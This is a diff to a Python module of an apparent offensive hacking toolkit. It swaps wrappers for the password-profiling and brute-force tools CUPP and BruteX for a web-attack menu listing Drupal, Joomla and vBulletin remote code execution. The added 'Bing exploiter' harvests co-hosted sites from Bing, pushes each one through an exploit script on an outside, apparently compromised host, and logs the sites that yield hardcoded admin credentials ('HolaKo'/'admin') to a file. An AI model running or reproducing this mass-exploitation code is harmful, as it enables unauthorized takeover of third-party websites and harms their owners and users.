@@ -1,21 +1,31 @@
 # region: outer menu operations
 menu_name = "Web utilities"
 menu_items = [
-    "CUPP - Common User Passwords Profiler",
-    "BruteX - Automatically bruteforces all services running on a target"
+    "Drupal hacking",
+    "Inurlbr",
+    "Wordpress and Joomla scanner",
+    "Gravity form scanner",
+    "File upload checker",
+    "Wordpress exploit scanner",
+    "Wordpress plugins scanner",
+    "Shell and directory finder",
+    "Joomla! remote code execution",
+    "Vbulletin remote code execution",
+    "Arachni - Web Application Security Scanner Framework",
+    "Private web f-scanner"
 ]
 
 menu_items.append("Back")
 # endregion
 
 # region: additonal imports
-import os
-import platform
-
-import shutil
-import subprocess
+import re
+import sys
+import urllib.request
 
 from colorama import Fore
+from urllib.request import Request, urlopen
+from urllib.parse import quote_plus, urlparse
 # endregion
 
 # region: class helpers
@@ -46,45 +56,23 @@ def safe_input(prompt, ctx):
         return input(prompt)
 # endregion
 
-# region: override class: cupp
-class CUPP:
+# region: override class: drupal
+class Drupal:
     menu_items = [
-        "Run interactive mode",
+        "Drupal bing exploiter",
         "Back"
     ]
         
     def __init__(self, ctx=None):
         self.ctx = ctx or {}
 
-        self.tool_direction = os.path.join(os.getcwd(), "tools")
-        self.install_direction = os.path.join(self.tool_direction, "CUPP")
-
-        self.git_repository = "https://github.com/Mebus/cupp.git"
-
-        if not os.path.isdir(self.tool_direction):
-            os.makedirs(self.tool_direction, exist_ok=True)
-
-        if not self.installed():
-            self.install()
-
-    def installed(self):
-        return os.path.isdir(self.install_direction) and os.path.exists(os.path.join(self.install_direction, "cupp.py"))
-
-    def install(self):
-        safe_print(self.ctx, "[*] Installing CUPP...")
-        
-        os.system(f"git clone --depth=1 {self.git_repository} {self.install_direction}")
-        os.system(f"pip install -r {os.path.join(self.install_direction, 'requirements.txt')}")
-
-        safe_print(self.ctx, "[+] CUPP installed successfully.")
-
     def run(self, ctx):
         self.ctx = ctx
-        safe_print(ctx, f"[*] CUPP: selected '{ctx.get('item')}'")
+        safe_print(ctx, f"[*] Drupal: selected '{ctx.get('item')}'")
         self.sub_menu(ctx)
 
     def sub_menu(self, ctx):
-        safe_print(ctx, "\nCUPP options:")
+        safe_print(ctx, "\nDrupal options:")
         for i, it in enumerate(self.menu_items, 1):
             safe_print(ctx, f"  [{i}] {it}")
         safe_print(ctx, "")
@@ -100,181 +88,95 @@ class CUPP:
         if sel.lower() == "back":
             return
 
-        if "interactive" in sel:
+        if "bing" in sel:
             self.run_interactive(ctx)
 
     def run_interactive(self, ctx):
-        safe_print(ctx, "\n[CUPP Interactive Mode]\n")
-
-        if not self.installed():
-            safe_print(ctx, "[!] CUPP is not installed. Attempting to install...")
-            try:
-                self.install()
-            except Exception as e:
-                safe_print(ctx, f"[!] Install error: {e}")
-                return
-
-        safe_print(ctx, "Enter arguments for cupp.py (leave empty to run interactive mode -i).")
-        user_args = safe_input("cupp.py args: ", ctx).strip()
-
-        if not user_args:
-            user_args = "-i"
-
-        cupp_py = os.path.join(self.install_direction, "cupp.py")
-        if not os.path.exists(cupp_py):
-            safe_print(ctx, "[!] cupp.py not found. Check installation.")
-            return
-
-        cmd_parts = [shutil.which("python") or "python", cupp_py] + user_args.split()
-        final_cmd = " ".join(cmd_parts)
-
-        safe_print(ctx, "\n[+] Built command:")
-        safe_print(ctx, f"    {final_cmd}\n")
-
-        confirm = safe_input("Run this command? (Y/n): ", ctx).strip().lower()
-        if confirm and confirm in ("n", "no"):
-            safe_print(ctx, "[*] Aborted by user.")
-            return
-
-        safe_print(ctx, "[*] Running CUPP...")
-        try:
-            os.system(final_cmd)
-        except Exception as e:
-            safe_print(ctx, f"[!] Error while running: {e}")
-        finally:
-            safe_print(ctx, "[*] CUPP finished (or stopped).")
-# endregion
-
-# region: override class: brutex
-class BruteX:
-    menu_items = [
-        "Run interactive mode",
-        "Back"
-    ]
-        
-    def __init__(self, ctx=None):
-        self.ctx = ctx or {}
-
-        self.tool_direction = os.path.join(os.getcwd(), "tools")
-        self.install_direction = os.path.join(self.tool_direction, "BruteX")
-
-        self.git_repository = "https://github.com/1N3/BruteX.git"
-
-        if not os.path.isdir(self.tool_direction):
-            os.makedirs(self.tool_direction, exist_ok=True)
-
-        if not self.installed():
-            self.install()
-
-    def installed(self):
-        return os.path.isdir(self.install_direction) and os.path.exists(os.path.join(self.install_direction, "brutex.py"))
-
-    def install(self):
-        safe_print(self.ctx, "[*] Installing BruteX...")
+        safe_print(ctx, "\n[*] Starting Bing exploiter session.\n")
 
         try:
-            res = subprocess.run(
-                ["git", "clone", "--depth=1", self.git_repository, self.install_direction],
-                check=False, capture_output=True, text=True
-            )
+            import requests
+        except Exception:
+            safe_print(ctx, "[!] The 'requests' library is required. Install with: pip install requests")
+            return
 
-            if res.returncode != 0:
-                safe_print(self.ctx, f"[!] git clone failed: {res.stderr.strip() or res.stdout.strip()}")
-            else:
-                safe_print(self.ctx, "[*] git clone completed.")
-        except FileNotFoundError:
-            safe_print(self.ctx, "[!] git not found. Please install git or clone manually.")
+        page = 1
+        ip = safe_input("[!] IP or domain: ", ctx).strip()
 
-        req_file = os.path.join(self.install_direction, "requirements.txt")
-        if os.path.exists(req_file):
-            res = subprocess.run([shutil.which("python") or "python", "-m", "pip", "install", "-r", req_file],
-                                  check=False, capture_output=True, text=True)
-            if res.returncode != 0:
-                safe_print(self.ctx, f"[!] pip install failed: {res.stderr.strip() or res.stdout.strip()}")
-            else:
-                safe_print(self.ctx, "[*] Python requirements installed.")
+        if not ip:
+            safe_print(ctx, "[!] No input provided — aborting.")
+            return
 
-        install_sh = os.path.join(self.install_direction, "install.sh")
-        if os.path.exists(install_sh):
-            os.chmod(install_sh, 0o755)
+        user = "HolaKo"
+        pwd = "admin"
+
+        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36"}
+
+        while page <= 50:
             try:
-                subprocess.run([install_sh], cwd=self.install_direction, check=False)
-                safe_print(self.ctx, "[*] install.sh executed.")
-            except Exception as e:
-                safe_print(self.ctx, f"[!] Error executing install.sh: {e}")
+                encoded_ip = quote_plus(ip)
+                url = ("https://www.bing.com/search?q=ip%3A{ip}"
+                    "&go=Valider&qs=n&form=QBRE&pq=ip%3A{ip}&sc=0-0&sp=-1&sk=&first={page}"
+                    ).format(ip=encoded_ip, page=page)
 
-        if self.installed():
-            safe_print(self.ctx, "[+] BruteX installed successfully.")
-        else:
-            safe_print(self.ctx, "[!] BruteX installation failed. Check output above.")
+                safe_print(ctx, f"[*] Requesting page {page} ...")
+                r = requests.get(url, headers=headers, timeout=10)
 
-    def run(self, ctx):
-        self.ctx = ctx
-        safe_print(ctx, f"[*] BruteX: selected '{ctx.get('item')}'")
-        self.sub_menu(ctx)
+                if r.status_code != 200:
+                    safe_print(ctx, f"[!] Bing returned status {r.status_code} for page {page}")
+                    page += 1
 
-    def sub_menu(self, ctx):
-        safe_print(ctx, "\nBruteX options:")
-        for i, it in enumerate(self.menu_items, 1):
-            safe_print(ctx, f"  [{i}] {it}")
-        safe_print(ctx, "")
-            
-        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
-        
-        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
-            self.__init__()
+                    continue
 
-        idx = int(choice) - 1
-        sel = self.menu_items[idx]
+                html = r.text
 
-        if sel.lower() == "back":
-            return
+                hrefs = re.findall(r'<a\s+href="(http[s]?://[^"]+)"', html, flags=re.I)
+                candidates = [h for h in hrefs if "bing.com" not in h and "microsoft" not in h][:200]
 
-        if "interactive" in sel:
-            self.run_interactive(ctx)
+                if not candidates:
+                    candidates = re.findall(r'<div class="b_title"><h2><a href="(http[s]?://[^"]+)"', html, flags=re.I)
 
-    def run_interactive(self, ctx):
-        safe_print(ctx, "\n[BruteX Interactive Mode]\n")
+                safe_print(ctx, f"[*] Found {len(candidates)} candidate links on page {page}")
 
-        if not self.installed():
-            safe_print(ctx, "[!] BruteX is not installed. Attempting to install...")
-            try:
-                self.install()
-            except Exception as e:
-                safe_print(ctx, f"[!] Install error: {e}")
-                return
+                for found in candidates:
+                    try:
+                        urlpa = urlparse(found)
+                        site = urlpa.netloc
 
-        safe_print(ctx, "Enter target IP or hostname for BruteX.")
-        safe_print(ctx, "You can also add extra arguments (e.g., -u userlist -p passlist).")
+                        if not site:
+                            continue
 
-        user_args = safe_input("Target IP and args: ", ctx).strip()
-        if not user_args:
-            safe_print(ctx, "[*] No input provided — aborting.")
-            return
+                        safe_print(ctx, f"[+] Testing at {site}")
 
-        brutex_py = os.path.join(self.install_direction, "brutex.py")
-        if not os.path.exists(brutex_py):
-            safe_print(ctx, "[!] brutex.py not found. Check installation.")
-            return
+                        encoded_site = quote_plus(site)
+                        exploit_url = f"http://crig-alda.ro/wp-admin/css/index2.php?url={encoded_site}&submit=submit"
 
-        cmd_parts = [shutil.which("python") or "python", brutex_py] + user_args.split()
-        final_cmd = " ".join(cmd_parts)
+                        try:
+                            r2 = requests.get(exploit_url, headers=headers, timeout=10)
+                        except Exception as e_req:
+                            safe_print(ctx, f"[!] Request to exploit URL failed for {site}: {e_req}")
+                            continue
 
-        safe_print(ctx, "\n[+] Built command:")
-        safe_print(ctx, f"    {final_cmd}\n")
+                        body = r2.text
 
-        confirm = safe_input("Run this command? (Y/n): ", ctx).strip().lower()
-        if confirm and confirm in ("n", "no"):
-            safe_print(ctx, "[*] Aborted by user.")
-            return
+                        if "User: HolaKo" in body:
+                            safe_print(ctx, f"[!] Exploit found => {site}")
+                            safe_print(ctx, f"user:{user} pass:{pwd}")
 
-        safe_print(ctx, "[*] Running BruteX...")
-        try:
-            os.system(final_cmd)
-        except Exception as e:
-            safe_print(ctx, f"[!] Error while running: {e}")
-        finally:
-            safe_print(ctx, "[*] BruteX finished (or stopped).")
+                            with open('up.txt', 'a', encoding='utf-8') as a:
+                                a.write(site + '\n')
+                                a.write("user:" + user + "\npass:" + pwd + "\n")
+                        else:
+                            safe_print(ctx, f"[-] Exploit not found at {site}")
+
+                    except Exception as ex_inner:
+                        safe_print(ctx, f"[!] Error testing candidate {found}: {ex_inner}")
+                        continue
+            except Exception as ex:
+                safe_print(ctx, f"[!] Error on page {page}: {ex}")
+
+            page += 10
+        safe_print(ctx, "[*] Bing exploiter run finished.")
 # endregion
 
 # region: actions utility
@@ -306,8 +208,18 @@ def execute(ctx):
 
     fprint(f"[*] Executing: {item}")
     actions = {
-        "CUPP - Common User Passwords Profiler": CUPP,
-        "BruteX - Automatically bruteforces all services running on a target": BruteX
+        "Drupal hacking": Drupal,
+        "Inurlbr": Inurlbr,
+        #"Wordpress and Joomla scanner",
+        #"Gravity form scanner",
+        #"File upload checker",
+        #"Wordpress exploit scanner",
+        #"Wordpress plugins scanner",
+        #"Shell and directory finder",
+        #"Joomla! remote code execution",
+        #"Vbulletin remote code execution",
+        #"Arachni - Web Application Security Scanner Framework",
+        #"Private web f-scanner"
     }
 
     action = actions.get(item)
